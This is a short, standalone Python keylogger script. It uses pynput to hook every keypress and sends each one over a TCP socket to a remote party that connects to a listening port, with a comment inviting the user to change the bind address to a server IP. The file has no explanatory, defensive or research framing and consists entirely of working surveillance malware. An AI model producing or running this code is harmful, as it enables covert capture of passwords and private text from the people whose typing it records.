import socket
from pynput.keyboard import Listener

# Configuration for the server connection
SERVER_IP = '127.0.0.1'  # Change to server IP
SERVER_PORT = 65432

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_IP, SERVER_PORT))
server_socket.listen(1)
conn, addr = server_socket.accept()
print(f"Connection established with {addr}")
def send_keystrokes(key,conn):
    try:
        key_data = str(key)
        conn.sendall(key_data.encode('utf-8'))
    except Exception as e:
        print(f"Error sending keystroke: {e}")

# Callback function for keystrokes
def on_press(key):
    send_keystrokes(key,conn)

# Listen for keyboard events
print('Starting Listening')
with Listener(on_press=on_press) as listener:
    listener.join()
